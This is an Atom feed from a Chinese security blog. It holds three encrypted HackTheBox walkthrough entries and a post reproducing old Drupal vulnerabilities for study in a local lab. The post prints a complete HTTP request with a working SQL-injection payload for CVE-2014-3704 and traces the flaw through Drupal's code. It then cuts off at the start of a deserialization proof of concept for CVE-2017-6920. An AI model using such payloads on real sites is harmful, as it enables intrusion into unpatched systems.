<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ca01h&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ca0y1h.top/"/>
  <updated>2021-01-31T04:08:29.751Z</updated>
  <id>http://ca0y1h.top/</id>
  
  <author>
    <name>ca01h</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox-Passage-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough/</id>
    <published>2021-01-31T04:06:32.000Z</published>
    <updated>2021-01-31T04:08:29.751Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6846db320cd128fad25d9ca1fc4c5d5ff88472c9760663f893219206ae954ae8">9b1741d19bc98bca523cf47d84dfbbb085c3cf46a927ce65af6caef4061203a1041781381ae7127f61cef454b32707e16282bf5c67dab7e65864a7a4209a696b7fa7c8e466479a500680add8659ee4aa9e28d07de24e90a6136f28402394c50b04b222fee842fbca8ef6728bc1a703b7f2081ec57b5df5c287e8c21765747016f4d2ce714155901d244689dce5883e5f471bebbbf4d0b0b520a8786aa2272d0e72b48a85cf00cfbaa9d3a1cc87ec3b699bb7633018501d41c4277a71c02f29d97fcf1c586c75e240760332fe86a1e6e472a6d88f128e499177052cfb7e4e6246a12a09aa69e47d19cf11c22c584e9fd89b4049395afc676c73c3f05671781015a906bc81b88546268e2bd823427b205007b2b42402705fb6bea14ad9b6683861614e0ac04a38dbfdc1a755c1e9318fd113224ab885e29aad27159f7fd90dca9a0ef8a05560ba19fb0d5897fbbdca1329c663de0f537a2bf1ba22e50656ff1010b62272eda8bc8106fdb7b8d854efce5689869f85aa12676bc5e25dae1f4b4ef2b783ffa993bb00f790f573c1ba437c435ac761ab5cd7d4bb8db1e04ac860718e1eeb86049aa3be9b921dfe87508903862f1fffc4f7a8159a847312a7dac1b914ba2307d5569cb76eaeed9e57cb7dce7ebbe178c39f4efc1ffa7a482e8278baa8150ba5d7b08bf43734480c418ca1f6d0d93c1b71d20f8779e0673da080ddd018382143a628581db30a09813042ae22529eac918e6c9ed29be425d685fa58268c910d717a0d1233cf4f144049f16470b656fcaf2cd5bf626e9bcc38e66f58de3ad35f4aad53e622914d5d25c11bcf45f81d805baf8d4863c4161dea90e80cd30dcaede1709b68150f1dd46618ee5c2d994a64a817c42040f8eba6687b8d01c10c6a5aeb0df3d2c1f47e93e3b42f0c2ff266a0d4c7f0b2d1b9ac8452aa0dab06ad8be4756765fe8464a000b423bba96f42e1019b4fc3f5b80b8a8514a1e0ef0000b4a7c54f72a9847fc2578339e103ce2e49c1765e8b354b50dabc3f3c867cbc2398c88c60576a8b35a4db9134ce3eec49ffcc10fc0d83f0e04eac7c9f71b1be33e4fbc36cfe65eb8826433fb04f0852fd906eb017cdeca17ae3c87dff3dff8ab40e8f1fc8cb7874e6d5b47da656153cdf2a854b61b2af9ca0fc018c5efa04cf364ff4104a686d53534786b93ee44d3203d784cb1467cb26f2ceb7eff1652d5ddc7cb82c5b8fb0ce47669710240a3d4dcfce0e8a0c1420c012925117b0db3634aa5f318aaefcedd799fdfc676604178673f2743309b9d475e2d2cd1437aaecadcd178f54be99898ac93a475c85132622b9b0fd72a16e1c27818fc5fe322c163df00b6b16cf16d4e5f520429e57d7edd254a064f942c94699dfe6323547f36e1903c3b55472f970535c5509e66de291dd10d43c29fe61574c796abdbc9de9315363351c3cfe4ead6d25304982e41b59896a2b190ceba01f77f5fd55216b235c330afb361bd34d324da43f3248cd512f5281e304d9c8db66cdbb436ebd6f2477d2bf32d54922e1a03e725072e2dff20d461aaf734eba204add8fdbdd513faf9ca32a6eb5efed6ebfce66237d4de91405676c7b18dee03174f5298f5403ba620268ad6a25a3608e3ad4f59cc769cc53d8b5ed4579434d7112009f972c3a83b59b0daf458d10e0d42d93091032670b9134a6bb41bd2b03373d5e548017b32f3d610bdea2ffd84fea39c997e37666da14b3585d418d769c8defdc8ec57682ce9d4e78f0d2f505188660f5958afdebb53e92d265c28f95b567414e868fd6258e3da975f2193cd15307967c7d3e6400061ec935a0573c520695b5cc8780ce3b36db3dd2aea088c763ab31a4452464e65e207e7a65bb36351312286708c98c4fd2351e6c791ef01fac83fb4807308be75e87bdd0d74a908b1eaea34e086ab7ccf2d56a081af49a97f2c969c8c149a1ae3bbfffa10c98c077dce44680c6129706e913c2fa534c7d7deb4ff9e9f0f03ab987a21b56c83e6182271f0bcb782b1d1d1fdeaca7f4ea8f149ba16e5e4ea1c1b96a8e9845b45612c7a1a41e8f2d6ab94800678403220221aed9317eac88b1434462669fd7f162a6f2bc9daaad36b19d19ee54a0e0e7fc9b205cce53fe68d4a29b3c7dab635e803ff785c6418fc7af4da4764c4e82178e916225638066e8fef4b12979e927ca3e3bc31352e96e3128b657fdac66c58dab4934a9aa7633043dd1fdc203059873dcf058dafc2a2191877e81e314ddf16f631a8299c10ec950c969919b812155f59901e15c86d6230ba8628edb26f34fbb3cf08924adcb204186b89a2a074fe73888d721a507c5b9ff2401def121c29c36feda361183f2f5e64d41a2befaf1502b5e5a5886deac75a3f32ced0c08fcad48da8d807010e2dbbfb8d6d07d50414aee28d6ab61a3fc58e0e1b110bdcab7801358a2587f4e9d9c5326eecf8fd0db3e29f501dc781cdf4eb13b785b340e11e90695be5f19496c2f3c9716e6e4ecf8061fa31c3292c09d5c0a01f054bbef6cd73d5a74632c567301f7f1515760ba79cb15bba8d2ef64f739e4592aaff7694731788739cd69bdbb36e2a10ded53d35c4a6b4dee75db7b503a5f235d4bf6442f2c998aa9c02abfa133055f1698e59d6643029ccb2e3436d3d77ef086a52bcbb178aa81e4b2fcd3776826ba12519fabac245e81fcea5c69a1525cb6c2ba4533f1ddf1f155ed762acb14a2295b5833a7530f721abaa2a3cd4eca324094159682b1b0ba0e52a8b7a68bb929fa95d6b19d4ff0849ddbb2b46b31b3d47540648175dac66fed3e9815afe6613677b2c7c7b1ed6e5080a56983f941c40dabe65d028657a955f6ba4ac93fa87282584f46d0bcf92f1dddf174167fa1354feaccb8c22ef73ab501dd90ce3f7ff93c68e46da8387d6c03104b231d3c7182740fbdebb7b2f1d7a19c436e25682db3ace6b79b3c573a768189de88e87f506f86dbd32c07c7fa5ba47f0bc50d66cc9e5b3b93b9ece44113047f13975446485569d721205cf8905fc3ffee88fa7da904d973ce2d4a1927e2db80b0e1ce6f6587611cce7c9d1ce75355a1c5adbe00bdcda6e73f07cd970daa5ee202b1e62b72c629519a9686b93a430ea1a7688700bf87c4985c5b412753966e3ad609f6577f3e52fb1b0a4a656d39b5f0fa659dad623d71c1ed6a9e1803c95833de51ff26ab80cee77ade1dca6e00e11d7016ff1be7541b968fe099869958d6a3bd1c1e238e596d31579535d2ccdf43ccc29a209220e5fdcd10d7fcf9936eaf228148e4ae6a0a9eebaad2f9658ec366f12ae3fd2ce702b7197a463db5b358e05176961c92a90c19c067aad8edb8e750d47dff414e721433df7676fd97e91d34f486222e1d51972173ff7d44e84f0a0ef70b21ea0d54254fd7c886dff65c08ffa5f574df10676ca3a97fe724bf409c84a2e542ab76c4a751f154db6b6d47806c1dc4fbbb2ff4b9dc77f69a66d2f4b86c48088cbd198e7232641002820e26c958e8ec3a507675d03b6c2074ee2b7447d4c6e4c1ef320e01bc649daac4b80f7d6292505145d8e9a176814bd92385750d8b60e3dcdaa0cef84262869845a15e018dcbd96427d8b107832d08c36302d5d5a97e526cc219f0b0984630d6b2323667aa2740a9c657fe5736104db5f6161b58aaed63915b15ecd4572386b27de835d050b56538a8cf847bdd930855b38c041de2214341277212fb2523091389bfbc7c358026de861a2c77ea5d6b56f1d16e03bd28a54985304c05335d98aba270ceb1809482414c0ab7688e72bc3fe5175f36d3d43c1508a006432382d6aee80832dcdca6de5f1c7d79d9341f556abdf827ef0a29a077fef02a00aa17c2cce08734257e128f90f0992d399b0d6a99e479bf64acda685a66c3f3273eb45efeba7ccda81b442c46e05bf01ccb5f56743a61d2f52d99ec43fc9607eda8ef9e0663dbfa13a8a84b2cebbb9c317310bb261eb6835cd3edd3308c3eee1fc01b952ab5a0523c41ef6fd57d711bdc5470417de62143e9131b11fc22fe13caa92a92a3514d77ffa36159098ae0e00f7cdf78b72ab002bc50029549793b190015baf4ee3caad8e328bcb6d8b41d97fe2fb5951cb5b9cfe0761ab651c9a98e15b3f4a4f2d17fcb4844e437c6904952fc961cee3ee23fca89193faf155195ae7e24c37976666a52307e2638218cc9fe2b76bc8709bb4736055fb412cc71689072890e820f28513c78e5e99c446534abf95c42cbefe26cb75368210bc0fea6af1cb1c1eacad7f674af557cbabdd30f6fd97c919478fecdf333f4084d90475456120512d1b02f55091d1bfb20b40cbaf4cd310f0f324f6731466539873656f2ae2f4808030a7dd88b13e31a140ad37e556bd3e21d205a7906ac93e9167cdc2c81bcb4afece1e6eb51fe7924ab92b14cba099e5a06aab211b20bf74a1fd15723e7d79ac9c1a08b0e634ca00c50940cc3cc5da7fed7d631537e1d5fb9a75b969a0ec40571c9ed8a502167cc7641c6e3ec3983b4c9f42b6c728be075ea098db494ee4c4fcff3a841f7feb50cb01171622930666e100afe9d72e2f08dce0a66b835724a0655e19ca75cc0e8a24f5b1c3765f11cb79bef3a2079ef2374c1484511b599717e82c0a284a3c7730fd029e4ff3df5a578a1ffb404eab60d4870211bcef56f0ca920bf1fbe4b01e8130b7831cda2a4d213a013a753412867339f7bf8f6d41dcd2da1a5af8147de4785006ff5adaf6ba4840a931eb057da5801b5fe681352cecf7299635040b12a7716e408ae4cdaf42c2b61ccec4806f65564dea698a18bc91641a2413e233ecd942d33f19dc0f975ad9e386686c9a7319d1726f9c89c457810f832a8c0bedf502873e8c02bc9a4375006fd9c5a33c34b0b3e400092501f97ca61ef4369e1ed59ce46031a401056e1bc01e4d75d5afc35a29e24be06f184e5a81fed4a3155ebd9c6070d608444fe80a14468b4674260efe76972cafbd175c7bd6c0eb3aa0fe5477fa72c307e322d6392b6c2b0041e2912ad7eff6c67ad290234e19ce1ca2193df4fba1a813cde04fd624bc1305515e5937100bfbc7e573d40d1c45149ca097e4e214f467f2d9e212739182675b01251d4acffb1b78611e3ad062b04a6bba5e67e20301d677e037c70476690288325409bd76ce4d7301b9b344da7d7b4c1b58739b6471d527d54521962443e2c698e6d0b3a39b65cf0b2529171bec2e33e533e1aedf953a698e3507859ea87228120fe898a6f15c5c7634e6c38041153bab2edcd2b058de8be4297bc011749840283505e49d3bc740e191a7c02293b9d594f705a1c40854dbe59bbb94d4d4d8002ba2869553596163f5ec2e525c5e67e89052220b14ff03f80c303d90523641a409ec4519e4497996a1ab78ff697aedb91c2365cb356abef11d0f0f3f42181b7667cb5d0b40de6a5a2fa5e06aab6bbe1cc4963eb6dc4a2c3722b555bd869e46bc80c123e5e03c5d3f3be81fc9743daeafdd1748a0cbe9c93191eed77b5908c2ae0670ca6613213e80662315867925e450928ef5f79fe0dfe0778ed5c349841780caa128bab77d4782136ddfe61de7ccf50b6452df6c6573e989b1d121d641484c00124fe092681ff614fce0e7b3757a23a58c9e7bf67ca04a5e266a984cc0a14e9dd7596e69f747bf110f6e5316d8d48771da27f53644d1488187e6ec9023eab07ad7cfc46401a1e3186aa23398d8b10239cc509012fea70703e73f476fc6203ad68831ca486dd8d6603f2856c337047336957eeb8ddcc6a6c7926e7ed5baf539029b83c8430d9436da4ff67a62d93a34853f9e01e2c684f3ee4c1072ce9013cef6d7c34d3b4bb82a7044d2aa43da6cc0466f69a17d4bccc0c7503c1fcfb7bf180003180129c26747eff25f067224350a9d904f27a1711c211a950d34372d21307f5e0275648db6bd99fd525947dc34cab6f2ea13a9741126dadf4deb85fa759282dd6628817c0195f00dcb19d9002bcb29296aa6818911d5256f78cd6e3818b5f2db6ac774e1a188920aac43d49f5aab5b3d4291e104fbef6b714ad63ba31d6137b622685fd4c2e0774185230e9dbc47d002ea81dbf38e08a83d1ac113931c3f901b2b0d7ce81919638a3fdf04f3492a1c1469590a8b6fea22b5dd1505aad1ff0a91bf4943f236998ba3f8b2fe83e83c871ab4fcd5e75308d59ba17faebd1ce8c6471edff2aabe45f238e47abe2d91d39e1a5c09b3ec6bc364652b3401f2c7164da4dbe99e8c41f18955c42234021b4ef153adafc311747a3217e2ebf374439fcf8f348ed8f6eb7407996704a129704d3e392821cc15e68842adef8f98da12dd4e870fb8bc71ea0eb57135a5f145418cb590d2e20e704c56a469d9273f307eb7921c3914217a864523a783ae95ef3059781affc108e4e8383e4872a36fa0daaab768ec10030dec70de7d96bbed0216874dc0073668809df0a8a4b54146c3b3c8f09d4364c9333a370dc0f0bcf502b3e78ad04864efb69ec79a7fed7e764c320e284af5923e2501d5095f3b324cde819eb0da4b15431c7e4d84963e195b59893680db130e62520dde0b50df47c380cf63e95911de3256eb591f8eb44e0c2024f14fbb4cb24472a666d0558dcd9853886d2cc6a98d657c0fe67c05232da97bd23ca5136e8f2453cd046fc320085f224a2bc588665d9a48af76ed14f11507c079d7e0bcedb6bd83712f3be5a2ea0c69583734634b864afe87c779c31aee63e0a1fb720cb2f6f002b826ea0f1a7f00051d76d7426f09e7b91d436832d86a54298927878c39f4c5148ed3703c91de5bde4b3b3a82ddaefde05230e4976a7ae3f6e32722f5122122f20137e5746a61bc41f9f4d45681cbe4ba7f4924c6480e27ef247b5fdebdf4ec57ea88c8018011c302c3c1198554e53edf0f760825461a84e6281ca628ab927b0ef3845a1ec3e90e5f6ceb264a0248c00b4b94e0d417e46173788534b95a0fd6c5615e9f9758196b90b413bc26c5754c394090c7a10ca778006e35b3a499573e2d881bd3e7394f51da20a0b1a44054814d3243409e999a0b3b0336ce172f93712219b586ddb32ed1e4913d1067ff09e8f3519670b3c6316eac975a33db515abb80e0912be1b659626d8f6aef9621d9450aa500f8af794c6351f0c41d7d30df68c2ebc93d3a1b8d314b5d7839656a988cf53ae1a7a36399a629faced146d6cf08012272b2d699f875ad47bcfbda79f41a0c91294e2fbc7f6eb130ae3b930275e24dff12bc08106494a90815c51a1c5e2f2fffeaa9e4157c3732385b394a30a2e903b87c3054fd8499d370c59a916783fa5fac41fbc8e97881f79e150d0c4ad63f46db96b085dd297b9266379ec23bfe45113983d8db758ae64f93091aa288a97e51d2f4c25766a4836b19e80288a5e60bae4114b053360465985fd51b88c3fa63dfdcbe64ce8d10b9f7af77f8fe097cfe840bd0ca3feeab7b51fbfc487d2c63bbc99d4471ab0ff97d377062c7fa28233d5dc7e340abe257808af9ebe928981c7452d34e0148af69c98a4c70af6a101cfaa2975aef7370d1d9c2a3437c0693532a63662f71a321f6c2cfb033e4e2d39912205648c95389b46e048ae23ab10e82c34f319dd67eb7fd7eed7e1930983a597af3b438c35dd59efc44140d72bb1482627dbb57c9604edf2a1b430dca2185019091f52ecf86baf527c33ad937f75ae1576778bc57c66ce5d8d88ec95d0b805551872448c567188e26c7e05e6f1676d547935335079fa065e84946aec2a0f123ad5eac5fa4ccf4041e264610ab2525f303afa5b7f8d5133932a13becd486d488b753bcdcc7eeb08273b4ec54e7bf71e6bf0468a36e95de991118f1e45c0875da9b21d734f3ae9e5e08be18ec8c3b18ef1e228736148fe397227d3d329568bc1cd2253ddf5167630107b80ce6e858090d3c47cb3a1c200f7e26ded923f59e118f26f32bd285da482a4fb17a833021e2c28176bb161850bf947ccd35d57bef82b694d28a9ecd3f7602d413549d2a39e42555b7548033792c719374c3450490264fccb4e8ff1ec0d3153e4c831b7f5baf066361af06c3056a78fd3ebb204de87fb5c1ab08783de30b36a6a3c55b46d580d37af45840dd3bebd36feacb182f8e431de1bf0cbc67b2c964223dea380cfe54720e3b1e91f16d0545ffae1c5c935707ae2c11a57f4bfeb5f1ef2453ef42cd3533269fe327b0085b1077e5e799729ca2154db110caa304609ec065dba3b6fe7b2de484a95b2652c41ce7c40d11d061bb4398b39a140e591e53f6f96c7a42a6e81582d2ffe9898344ea3c26569d8130f1604f944ba6db48dbe91787bcd74d88dd7ff66669a860f06eb8d5573db95607eb37a806dffd3e4ca8165efd14f75829eb32038af0b401267f9c228627de1e6e2d4c0fdd95ba0e26533072194a5e830395bd81d66b4340e8f9295a2848f93b8334185d44db2cb0c4aca00fce6742a355000a95a86d081da406af7d628daa7add8d2a84499b48e0c0c1b14b0de898f1d404ab846245343a4da515d51203053bbfe4617a6dba6f64dfcea64d6cbc7d5b039b5f6f9e5573bff5ec0c667ffa5d057dd932804b295c99f0b1c152041994b4e13d8d83d8f457717936b9741e2a71bacbb227b189618691e0e73f37c9b14ed41a35fa8864dc1e660b60afc1829bfaacaa60c431bfcb89dc89385d05143e2a76f8f42819a2f99c289648e7c253dbf97bf7bd715c5d612997ad58c5371e6025a643e838edd54a30fc3cacbd3f25de2cdea082b2ad79644d5dd0b69390860d00b290ea560bef18186fbc433360aa55626d4c305e89c7d0684de61638a094a34899646dca67a61c0cec78e9cb5630384e29947fe4ea6bf6e1b0d7b39606b4f35fb6b603b8d19c1f2163abd71fe0a8586ab43c5fd224cba08716c9f18fa7b975448ddd9adca69c09fc827b7596aef859ae9241401fc0c1f899ee8963a97290419784a15d807fd7ef9267a97ec04757c3745db2c0682715b9a350e1e4c6e499023813efcf5b03615362ad6d00c8898dc2282c39576ed4bcba894d1de0d836a0eefb03195fbc3a3381bb63ebe957a19bb3f991526676016cd24beadcd970241db3a5942b5dd2ebd59947c6e13042f343061c7434571caa060e59119b6d49824370bb45028b264b5fb56b81c259418d8810084450fc8a3f9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Delivery-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough/</id>
    <published>2021-01-25T13:40:50.000Z</published>
    <updated>2021-01-31T04:08:21.214Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c7a4e24ecb3297b4f4dff3f2cb1d8367222253fc649d328db0af4fc40f517521"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Academy-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough/</id>
    <published>2021-01-24T13:44:57.000Z</published>
    <updated>2021-02-05T10:34:08.845Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fff9a5e0d9ca6fa774a982315d2eba5262fc3915dd4196909cc507a2504a369f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Drupal历史漏洞分析复现</title>
    <link href="http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-22T13:35:34.000Z</published>
    <updated>2021-01-22T13:38:44.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Durpal历史漏洞复现记录">Durpal历史漏洞复现记录</h1><p>在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：</p><p><a href="https://blog.csdn.net/u011474028/article/details/53021051">https://blog.csdn.net/u011474028/article/details/53021051</a></p><p><a href="https://blog.fleeto.us/post/drupal-from-request-to-response/">https://blog.fleeto.us/post/drupal-from-request-to-response/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2014-3704-SQL注入漏洞">CVE-2014-3704 SQL注入漏洞</h2><h3 id="影响版本">影响版本</h3><p>Drupal &lt; 7.32</p><h3 id="环境安装">环境安装</h3><p>从官网中下载Drupal 7.31版本的源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/drupal/releases/7.31</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建站点后，更改数据库的相关配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127141314.png" alt=""></p><p>访问本地IP:8080端口，使用默认安装配置即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127132647.png" alt=""></p><p>验证安装成功：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140826.png" alt=""></p><p>在不登录的情况下，验证payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140938.png" alt=""></p><h3 id="漏洞分析">漏洞分析</h3><p>我们可以从上面这张图中看出，漏洞的触发点是在user.module文件中的<code>user_login_authenticate_validate()</code>这个函数。</p><p>下断点调试，查看函数调用栈：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201231923.png" alt=""></p><p>这个函数在2149行对准备将提交的name参数进行SQL语句拼接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232302.png" alt=""></p><p>继续跟进<code>db_query</code>函数，此时payload存储在args数组中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232615.png" alt=""></p><p>调用<code>query()</code>函数，在这个函数中，继续调用<code>expandArguments</code>进行实质的SQL语句拼接</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161036.png" alt=""></p><p>此时query已经是拼接后的SQL语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161432.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161523.png" alt=""></p><p>最后执行SQL</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161630.png" alt=""></p><p>在mysql monitor工具中可以看到具体的执行语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161715.png" alt=""></p><h2 id="CVE-2017-6920-反序列化任意代码执行漏洞">CVE-2017-6920 反序列化任意代码执行漏洞</h2><h3 id="影响版本-v2">影响版本</h3><p>Drupal 8 &lt; 8.3.3</p><h3 id="环境安装-v2">环境安装</h3><p>从官网中下载Durpal 8.3.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.3.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro集成环境搭建，更改php.ini配置，打开Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130359.png" alt=""></p><p>查看PHPINFO验证是否开启Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130431.png" alt=""></p><p>必须在配置文件中启用yaml.decode_php，否则无法复现成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaml.decode_php &#x3D; 1</span><br></pre></td></tr></table></figure><ol><li><p>登录管理员账号</p></li><li><p>访问<code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></p></li><li><p>POC：<code>!php/object 